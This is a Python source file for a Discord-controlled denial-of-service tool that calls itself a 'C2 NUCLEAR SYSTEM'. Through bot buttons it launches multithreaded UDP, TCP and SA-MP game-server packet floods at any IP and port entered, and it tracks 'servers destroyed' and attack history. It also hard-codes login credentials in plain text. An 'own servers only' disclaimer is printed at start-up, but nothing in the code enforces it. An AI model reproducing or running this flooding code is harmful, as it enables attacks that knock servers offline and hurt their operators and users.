#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM ⚡
# 🔥 30,000 THREADS - ALL FEATURES COMBINED 🔥
# ⚠️ WARNING: USE ONLY ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import ipaddress
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# رسالة تحذيرية قوية
# ============================================
print("""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                              ⚠️  تــحــذيــر شــديــد ⚠️                                                              ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                                          ║
║  هذا الكود هو أداة اختبار ضغط (Stress Test) تم تصميمها حصرياً لاختبار السيرفرات التي تملكها أنت شخصياً.                                    ║
║                                                                                                                                          ║
║  ⛔ استخدام هذه الأداة على أي سيرفر لا تملكه يعتبر:                                                                                      ║
║     • جريمة إلكترونية يعاقب عليها القانون بالسجن والغرامات المالية                                                                       ║
║     • خرق لشروط خدمة Discord وجميع منصات الألعاب                                                                                         ║
║     • انتهاك صارخ لخصوصية وأمان الآخرين                                                                                                  ║
║                                                                                                                                          ║
║  ✅ أنت وحدك من تتحمل المسؤولية القانونية الكاملة عن أي استخدام لهذه الأداة.                                                              ║
║  ❌ المطور (LI ZANDYA) يعلن تنصله الكامل من أي استخدام غير قانوني أو ضار لهذا الكود.                                                     ║
║                                                                                                                                          ║
║  🔐 بإكمالك تشغيل هذا الكود، فإنك تقر وتتعهد بأنك:                                                                                       ║
║     1. تملك جميع السيرفرات التي ستختبرها                                                                                                 ║
║     2. لن تستخدم هذه الأداة ضد أي سيرفر لا تملكه                                                                                          ║
║     3. تتحمل المسؤولية القانونية الكاملة عن أي ضرر ناتج عن استخدامك                                                                      ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

input("🔥 اضغط Enter للمتابعة إذا كنت توافق على الشروط أعلاه وتملك السيرفرات التي ستختبرها...")

# ============================================
# التوكن - سيتم طلبه عند التشغيل
# ============================================
print("\n📝 Enter your Discord Bot Token to continue")
TOKEN = input("🔑 Token: ").strip()
if not TOKEN:
    print("❌ No token provided!")
    exit(1)

# ============================================
# إعدادات القوة - 30,000 ثريد
# ============================================
CPU_CORES = os.cpu_count() or 4
MAX_THREADS = 30000  # 30,000 ثريد فقط
MAX_PACKET_SIZE = 4096
BUFFER_SIZE = 1024 * 1024 * 50

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
    CPU_PERCENT = psutil.cpu_percent(interval=0.5)
except:
    TOTAL_RAM = 4
    CPU_PERCENT = 0

# ============================================
# بيانات تسجيل الدخول
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"

# ============================================
# قوائم بيانات
# ============================================
USER_AGENTS = []
for v in range(100, 200):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")

# ============================================
# تخزين بيانات المستخدمين
# ============================================
active_users = {}
total_users = set()
attack_history = []

# ============================================
# نظام الهجوم المتكامل
# ============================================
class NuclearTester:
    def __init__(self):
        self.running = False
        self.authenticated = False
        self.authenticated_user = None
        self.stats = {
            'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
            'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
            'peak_speed_pps': 0, 'peak_speed_mbps': 0
        }
        self.threads = MAX_THREADS
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)
    
    def check_auth(self, ip, username, password):
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False
    
    # ============================================
    # SAMP ATTACK
    # ============================================
    async def samp_attack(self, ip, port, duration, user_id=None):
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        self.stats['active_attacks'] += 1
        attack_id = f"SAMP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "SAMP"}
            total_users.add(user_id)
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                start = time.time()
                while self.running and time.time() - start < duration:
                    packet = b'SAMP'
                    packet += struct.pack('<I', random.randint(1, 99999))
                    packet += b'\x80'
                    packet += struct.pack('<fffff', 
                        random.uniform(-3000,3000), random.uniform(-3000,3000),
                        random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
                    packet += struct.pack('<I', random.randint(1,46))
                    packet += struct.pack('<I', 99999)
                    packet += os.urandom(500)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                sock.close()
            except:
                pass
        
        workers = min(self.threads, 500)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        rate = sent / duration
        mbps = (bytes_sent / duration) / 1024 / 1024
        if rate > self.stats['peak_speed_pps']:
            self.stats['peak_speed_pps'] = rate
        
        attack_history.append({
            'time': datetime.now().strftime("%H:%M:%S"),
            'type': 'SAMP', 'target': f"{ip}:{port}", 'packets': sent, 'rate': rate
        })
        
        return sent, rate, mbps
    
    # ============================================
    # UDP ATTACK
    # ============================================
    async def udp_attack(self, ip, port, duration, user_id=None):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"UDP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "UDP"}
            total_users.add(user_id)
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                start = time.time()
                while self.running and time.time() - start < duration:
                    pkt = os.urandom(random.randint(512, MAX_PACKET_SIZE))
                    sock.sendto(pkt, (ip, port))
                    sent += 1
                    bytes_sent += len(pkt)
                sock.close()
            except:
                pass
        
        workers = min(self.threads, 300)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        rate = sent / duration
        attack_history.append({
            'time': datetime.now().strftime("%H:%M:%S"),
            'type': 'UDP', 'target': f"{ip}:{port}", 'packets': sent, 'rate': rate
        })
        
        return sent, rate
    
    # ============================================
    # TCP ATTACK
    # ============================================
    async def tcp_attack(self, ip, port, duration, user_id=None):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"TCP_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        sent, bytes_sent = 0, 0
        
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "TCP"}
            total_users.add(user_id)
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                start = time.time()
                while self.running and time.time() - start < duration:
                    try:
                        sock.connect((ip, port))
                        data = os.urandom(1024)
                        sock.send(data)
                        sent += 1
                        bytes_sent += len(data)
                        sock.close()
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                    except:
                        pass
                sock.close()
            except:
                pass
        
        workers = min(self.threads, 200)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        rate = sent / duration
        return sent, rate
    
    # ============================================
    # ULTIMATE ATTACK - ALL METHODS
    # ============================================
    async def ultimate_attack(self, ip, port, duration, user_id=None):
        self.running = True
        self.stats['active_attacks'] += 1
        attack_id = f"ULTIMATE_{ip}_{port}_{int(time.time())}"
        self.active_attacks[attack_id] = time.time()
        
        if user_id:
            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "ULTIMATE"}
            total_users.add(user_id)
        
        tasks = [
            self.samp_attack(ip, port, duration),
            self.udp_attack(ip, port, duration),
            self.tcp_attack(ip, port, duration)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        total_packets = sum([r[0] for r in results if isinstance(r, tuple) and len(r) > 0])
        
        self.stats['total_packets'] += total_packets
        self.stats['servers_destroyed'] += 1
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        del self.active_attacks[attack_id]
        if user_id and user_id in active_users:
            del active_users[user_id]
        
        attack_history.append({
            'time': datetime.now().strftime("%H:%M:%S"),
            'type': 'ULTIMATE', 'target': f"{ip}:{port}", 'packets': total_packets, 'rate': total_packets/duration
        })
        
        return total_packets, total_packets / duration
    
    def stop(self):
        self.running = False
        return True

tester = NuclearTester()

# ============================================
# واجهة تسجيل الدخول
# ============================================
class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="💀 C2 NUCLEAR LOGIN 💀")
        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
        self.add_item(self.ip); self.add_item(self.user); self.add_item(self.pwd)
    
    async def on_submit(self, interaction: discord.Interaction):
        if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 {self.user.value}\n💀 Type !von to open panel", ephemeral=True)
        else:
            await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)

class LoginView(View):
    def __init__(self):
        super().__init__(timeout=180)
    @discord.ui.button(label="🔐 ENTER C2 SYSTEM", style=discord.ButtonStyle.danger, emoji="💀")
    async def login(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())

# ============================================
# لوحة التحكم الرئيسية
# ============================================
class ControlPanel(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎮 SAMP", style=discord.ButtonStyle.danger, row=0, emoji="⚡")
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 SAMP ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 SAMP attack on {ip.value}:{port.value}", ephemeral=True)
            packets, rate, mbps = await tester.samp_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n📊 {mbps:.2f} Mbps", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="📡 UDP", style=discord.ButtonStyle.primary, row=0, emoji="⚡")
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 UDP ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 UDP attack on {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.udp_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="🔗 TCP", style=discord.ButtonStyle.secondary, row=0, emoji="⚡")
    async def tcp_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 TCP ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 TCP attack on {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.tcp_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Connections: {packets:,}\n⚡ Rate: {rate:,.0f} cps", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, row=1, emoji="💀")
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="💀 ULTIMATE ATTACK 💀")
        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 ULTIMATE on {ip.value}:{port.value}", ephemeral=True)
            packets, rate = await tester.ultimate_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
            await interaction.followup.send(f"✅ COMPLETE!\n📦 Total Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        elapsed = time.time() - tester.stats['start_time'] if tester.stats['start_time'] else 0
        embed = discord.Embed(title="💀 C2 NUCLEAR STATISTICS", color=0xFFD700)
        embed.add_field(name="📦 Total Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
        embed.add_field(name="💾 Total Data", value=f"{tester.stats['total_bytes']/1024/1024:.2f} MB", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
        embed.add_field(name="⚡ Active", value=f"{tester.stats['active_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="💀 Destroyed", value=f"{tester.stats['servers_destroyed']}", inline=True)
        embed.add_field(name="👥 Users", value=f"{len(total_users)}", inline=True)
        embed.add_field(name="🔧 Threads", value=f"{tester.threads:,}", inline=True)
        embed.add_field(name="⏱️ Uptime", value=f"{int(elapsed//60)}m {int(elapsed%60)}s", inline=True)
        embed.add_field(name="💻 CPU", value=f"{CPU_CORES} Cores", inline=True)
        embed.add_field(name="💾 RAM", value=f"{TOTAL_RAM} GB", inline=True)
        embed.set_footer(text="💀 LI ZANDYA C2 NUCLEAR SYSTEM 💀")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="👥 USERS", style=discord.ButtonStyle.secondary, row=2, emoji="👥")
    async def users_btn(self, interaction: discord.Interaction, button: Button):
        active = len(active_users)
        embed = discord.Embed(title="👥 USER STATISTICS", color=0x00BFFF)
        embed.add_field(name="📊 Total Users", value=f"`{len(total_users)}`", inline=True)
        embed.add_field(name="⚡ Active Users", value=f"`{active}`", inline=True)
        embed.add_field(name="💤 Inactive", value=f"`{len(total_users) - active}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📋 HISTORY", style=discord.ButtonStyle.secondary, row=2, emoji="📋")
    async def history_btn(self, interaction: discord.Interaction, button: Button):
        if not attack_history:
            await interaction.response.send_message("No attack history yet.", ephemeral=True)
            return
        history_text = ""
        for h in attack_history[-10:]:
            history_text += f"• {h['time']} | {h['type']} | {h['target']} | {h['packets']:,} pps\n"
        embed = discord.Embed(title="📋 ATTACK HISTORY", description=f"```{history_text}```", color=0xFFA500)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        tester.stop()
        active_users.clear()
        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)

# ============================================
# البوت الرئيسي
# ============================================
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════════════════════╗
║              ✅ LI ZANDYA C2 NUCLEAR SYSTEM IS ONLINE! ✅                ║
╠══════════════════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                                       ║
║ 💻 CPU: {CPU_CORES} Cores ({CPU_PERCENT}% Usage)                         ║
║ 🔥 Threads: {tester.threads:,} (30,000)                                  ║
║ 💾 RAM: {TOTAL_RAM} GB                                                   ║
║ 🎯 Methods: SAMP | UDP | TCP | ULTIMATE                                 ║
║ 👥 Total Users: {len(total_users)}                                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║ 🔐 Type !login to authenticate                                           ║
║ 💀 After login, type !von to open C2 panel                               ║
║ ⚠️ USE ONLY ON SERVERS YOU OWN!                                         ║
╚══════════════════════════════════════════════════════════════════════════╝
    """)

@bot.command()
async def login(ctx):
    await ctx.send("🔐 **C2 SYSTEM AUTHENTICATION**", view=LoginView())

@bot.command()
async def von(ctx):
    if not tester.authenticated:
        await ctx.send("❌ ACCESS DENIED! Type `!login` first.")
        return
    embed = discord.Embed(
        title="💀 LI ZANDYA C2 NUCLEAR PANEL 💀",
        description=f"```🔥 System: {CPU_CORES} Cores | {tester.threads:,} Threads\n💾 RAM: {TOTAL_RAM} GB\n🏆 Peak: {tester.stats['peak_speed_pps']:,.0f} pps\n👑 Commander: {tester.authenticated_user}\n👥 Users: {len(total_users)}```",
        color=0xFF0000
    )
    await ctx.send(embed=embed, view=ControlPanel())

if __name__ == "__main__":
    print("🚀 Starting LI ZANDYA C2 NUCLEAR SYSTEM...")
    print("💀 30,000 Threads Mode Activated!")
    bot.run(TOKEN)
